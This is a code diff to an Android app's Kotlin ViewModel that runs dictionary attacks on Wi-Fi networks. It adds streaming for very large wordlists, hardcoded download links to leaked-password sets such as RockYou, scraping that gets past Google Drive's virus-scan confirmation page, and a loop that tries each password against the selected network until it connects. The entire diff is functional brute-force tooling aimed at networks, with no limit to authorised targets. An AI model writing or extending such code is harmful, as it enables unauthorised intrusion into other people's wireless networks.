@@ -11,6 +11,7 @@ import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
 import android.net.NetworkRequest
+import android.net.Uri
 import android.net.wifi.ScanResult
 import android.net.wifi.WifiConfiguration
 import android.net.wifi.WifiManager
@@ -26,6 +27,7 @@ import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
+import java.io.InputStream
 import java.net.URL
 import kotlin.coroutines.resume
 
@@ -66,8 +68,21 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     private val _totalPasswords = MutableStateFlow(0L)
     val totalPasswords: StateFlow<Long> = _totalPasswords
 
+    // Represents either an in-memory list or a URI to a file for streaming
+    sealed class DictionarySource {
+        data class InMemory(val lines: List<String>) : DictionarySource()
+        data class FileUri(val uri: Uri) : DictionarySource()
+        object None : DictionarySource()
+    }
+
+    private val _dictionarySource = MutableStateFlow<DictionarySource>(DictionarySource.None)
+
+    // We retain dictionary for UI compatibility if needed, although it might just show a preview
     private val _dictionary = MutableStateFlow<List<String>>(emptyList())
     val dictionary: StateFlow<List<String>> = _dictionary
+
+    private val _downloadProgress = MutableStateFlow<Float?>(null)
+    val downloadProgress: StateFlow<Float?> = _downloadProgress
 
     private val dictionaryUrls = mapOf(
         "RockYou" to "https://drive.google.com/uc?export=download&id=1Is4puS_7DsQLyXo3h5yxHYz8fOe_o_4h",
@@ -77,31 +92,176 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         "Birthdays (1980-2010)" to "https://drive.google.com/uc?export=download&id=10-5CLasOmnKKXyev3_DCBSd179lOkcGz",
         "500,000-Word Super List" to "https://drive.google.com/uc?export=download&id=1009Wo_1_Kp2smZU6gu58_KC1dg32P2uJ",
         "Two Million Password Set" to "https://drive.google.com/uc?export=download&id=1-cxYagogFXGdXDBg94P5o5i14U9Zi5bt",
+        "10-Digit Numbers" to "https://drive.google.com/uc?export=download&id=1-UUgpot08dghuKGWgWNKwRmCVY6Pmr_H",
         "20 Million Password Set" to "https://drive.google.com/uc?export=download&id=1-ff2HELXghs_YBniy4GTszONlywPULs2",
         "160 Million Password Set" to "https://drive.google.com/uc?export=download&id=1-XPAMKVJ77HFNB2qNxgeEtyJq1awkFeP"
     )
 
+    private fun getGoogleDriveDownloadUrl(urlString: String): String {
+        return try {
+            val url = URL(urlString)
+            var connection = url.openConnection() as java.net.HttpURLConnection
+            connection.instanceFollowRedirects = false
+            var redirectUrl = connection.getHeaderField("Location")
+
+            if (redirectUrl != null) {
+                connection.disconnect()
+                // If it's a redirect, it might be the virus scan page
+                val checkUrl = URL(redirectUrl)
+                val checkConnection = checkUrl.openConnection() as java.net.HttpURLConnection
+                try {
+                    checkConnection.connect()
+
+                    val contentType = checkConnection.contentType ?: ""
+
+                    if (contentType.startsWith("text/html")) {
+                        val content = checkConnection.inputStream.bufferedReader().use { it.readText() }
+
+                        // Check if it's the virus scan warning page and extract the download link
+                        if (content.contains("uc-download-link")) {
+                            val confirmRegex = """name="confirm" value="([^"]+)"""".toRegex()
+                            val uuidRegex = """name="uuid" value="([^"]+)"""".toRegex()
+                            val confirmMatch = confirmRegex.find(content)
+                            val uuidMatch = uuidRegex.find(content)
+
+                            if (confirmMatch != null) {
+                                val confirmToken = confirmMatch.groupValues[1]
+                                var finalUrl = "$redirectUrl&confirm=$confirmToken"
+                                if (uuidMatch != null) {
+                                    finalUrl += "&uuid=${uuidMatch.groupValues[1]}"
+                                }
+                                return finalUrl
+                            }
+                        }
+                    }
+                } finally {
+                    checkConnection.disconnect()
+                }
+                return redirectUrl
+            }
+            connection.disconnect()
+            urlString
+        } catch (e: Exception) {
+            android.util.Log.e("MainViewModel", "Error getting Google Drive download URL for $urlString", e)
+            urlString
+        }
+    }
+
     fun setDictionary(name: String) {
-        viewModelScope.launch(Dispatchers.IO) {
+        viewModelScope.launch {
             try {
-                val url = dictionaryUrls[name] ?: return@launch
-                _logMessages.value = _logMessages.value + "Downloading dictionary from: $url"
-                val dictionaryContent = URL(url).readText()
-                val lines = dictionaryContent.lines()
-                _dictionary.value = lines
-                _totalPasswords.value = lines.size.toLong()
-                _logMessages.value = _logMessages.value + "Dictionary loaded successfully."
+                val originalUrlString = dictionaryUrls[name] ?: return@launch
+                val context = getApplication<Application>().applicationContext
+                val file = java.io.File(context.cacheDir, "$name.txt")
+
+                val exists = withContext(Dispatchers.IO) {
+                    file.exists() && file.length() > 0
+                }
+
+                if (exists) {
+                    _logMessages.value = _logMessages.value + "Loading cached dictionary: $name"
+                } else {
+                    _logMessages.value = _logMessages.value + "Downloading dictionary from: $originalUrlString"
+                    _downloadProgress.value = 0f
+
+                    withContext(Dispatchers.IO) {
+                        val urlString = getGoogleDriveDownloadUrl(originalUrlString)
+                        val url = URL(urlString)
+                        val connection = url.openConnection() as java.net.HttpURLConnection
+                        // Handle further redirects
+                        connection.instanceFollowRedirects = true
+                        connection.connect()
+
+                        val fileLength = connection.contentLength
+
+                        connection.inputStream.use { input ->
+                            java.io.FileOutputStream(file).use { fileOutput ->
+                                val data = ByteArray(4096)
+                                var total: Long = 0
+                                var count: Int
+
+                                while (input.read(data).also { count = it } != -1) {
+                                    total += count.toLong()
+                                    if (fileLength > 0) {
+                                        val progress = (total * 100 / fileLength).toFloat() / 100f
+                                        withContext(Dispatchers.Main) {
+                                            _downloadProgress.value = progress
+                                        }
+                                    } else {
+                                        // Indeterminate progress
+                                        withContext(Dispatchers.Main) {
+                                            _downloadProgress.value = -1f
+                                        }
+                                    }
+                                    fileOutput.write(data, 0, count)
+                                }
+                            }
+                        }
+                    }
+                }
+
+                val count = withContext(Dispatchers.IO) {
+                    file.bufferedReader().useLines { it.count().toLong() }
+                }
+
+                val previewLines = withContext(Dispatchers.IO) {
+                    file.bufferedReader().useLines { it.take(100).toList() }
+                }
+
+                _downloadProgress.value = null
+                _dictionarySource.value = DictionarySource.FileUri(Uri.fromFile(file))
+                _dictionary.value = previewLines // Preview instead of loading entirely in-memory
+                _totalPasswords.value = count
+                _logMessages.value = _logMessages.value + "Dictionary loaded successfully. Ready to use."
             } catch (e: Exception) {
+                _downloadProgress.value = null
                 _logMessages.value = _logMessages.value + "Error downloading dictionary: ${e.message}"
             }
         }
     }
 
     fun setDictionaryFromFile(content: String) {
-        val lines = content.lines()
-        _dictionary.value = lines
-        _totalPasswords.value = lines.size.toLong()
-        _logMessages.value = _logMessages.value + "Dictionary loaded from file."
+        viewModelScope.launch {
+            val lines = content.lines()
+            _dictionarySource.value = DictionarySource.InMemory(lines)
+            _dictionary.value = lines
+            _totalPasswords.value = lines.size.toLong()
+            _logMessages.value = _logMessages.value + "Dictionary loaded from file."
+        }
+    }
+
+    fun setDictionaryFromUri(uri: Uri) {
+        viewModelScope.launch {
+            _dictionarySource.value = DictionarySource.FileUri(uri)
+            _dictionary.value = emptyList() // clear in-memory preview
+
+            // Calculate total passwords safely using streaming to avoid OOM
+            try {
+                val context = getApplication<Application>().applicationContext
+
+                val count = withContext(Dispatchers.IO) {
+                    val inputStream: InputStream? = context.contentResolver.openInputStream(uri)
+                    if (inputStream != null) {
+                        var streamCount = 0L
+                        inputStream.bufferedReader().useLines { lines ->
+                            streamCount = lines.count().toLong()
+                        }
+                        streamCount
+                    } else {
+                        -1L
+                    }
+                }
+
+                if (count != -1L) {
+                    _totalPasswords.value = count
+                    _logMessages.value = _logMessages.value + "Custom dictionary prepared ($count passwords)."
+                } else {
+                    _logMessages.value = _logMessages.value + "Failed to open dictionary file."
+                }
+            } catch (e: Exception) {
+                _logMessages.value = _logMessages.value + "Error reading custom dictionary."
+            }
+        }
     }
 
     @Suppress("DEPRECATION")
@@ -148,27 +308,31 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             _logMessages.value = listOf("Starting attack on ${_selectedNetwork.value?.SSID}...")
 
             withContext(Dispatchers.IO) {
-                for ((index, password) in _dictionary.value.withIndex()) {
-                    if (!_isAttacking.value) break
-
-                    val startTime = System.currentTimeMillis()
-
-                    val success = connectToWifi(password)
-
-                    val endTime = System.currentTimeMillis()
-                    val timeTaken = endTime - startTime
-
-                    withContext(Dispatchers.Main) {
-                        _currentPassword.value = password
-                        _passwordsTried.value = index + 1L
-                        val newAverage =
-                            ((_averageTimePerPassword.value * index) + timeTaken) / (index + 1)
-                        _averageTimePerPassword.value = newAverage
-                        _logMessages.value = _logMessages.value + "Tried: $password - ${if (success) "Success!" else "Failed"}"
-
-                        if (success) {
-                            _logMessages.value = _logMessages.value + "Password found: $password"
-                            _isAttacking.value = false
+                val source = _dictionarySource.value
+                when (source) {
+                    is DictionarySource.InMemory -> {
+                        runAttackLoop(source.lines.asSequence())
+                    }
+                    is DictionarySource.FileUri -> {
+                        val context = getApplication<Application>().applicationContext
+                        val inputStream: InputStream? = context.contentResolver.openInputStream(source.uri)
+                        if (inputStream != null) {
+                            val reader = inputStream.bufferedReader()
+                            try {
+                                val seq = reader.lineSequence()
+                                runAttackLoop(seq)
+                            } finally {
+                                reader.close()
+                            }
+                        } else {
+                            withContext(Dispatchers.Main) {
+                                _logMessages.value = _logMessages.value + "Failed to open dictionary stream."
+                            }
+                        }
+                    }
+                    DictionarySource.None -> {
+                        withContext(Dispatchers.Main) {
+                            _logMessages.value = _logMessages.value + "No dictionary selected."
                         }
                     }
                 }
@@ -178,6 +342,33 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 _logMessages.value = _logMessages.value + "Attack finished. Password not found."
             }
             _isAttacking.value = false
+        }
+    }
+
+    private suspend fun runAttackLoop(sequence: Sequence<String>) {
+        for ((index, password) in sequence.withIndex()) {
+            if (!_isAttacking.value) break
+
+            val startTime = System.currentTimeMillis()
+
+            val success = connectToWifi(password)
+
+            val endTime = System.currentTimeMillis()
+            val timeTaken = endTime - startTime
+
+            withContext(Dispatchers.Main) {
+                _currentPassword.value = password
+                _passwordsTried.value = index + 1L
+                val newAverage =
+                    ((_averageTimePerPassword.value * index) + timeTaken) / (index + 1)
+                _averageTimePerPassword.value = newAverage
+                _logMessages.value = _logMessages.value + "Tried: $password - ${if (success) "Success!" else "Failed"}"
+
+                if (success) {
+                    _logMessages.value = _logMessages.value + "Password found: $password"
+                    _isAttacking.value = false
+                }
+            }
         }
     }
 
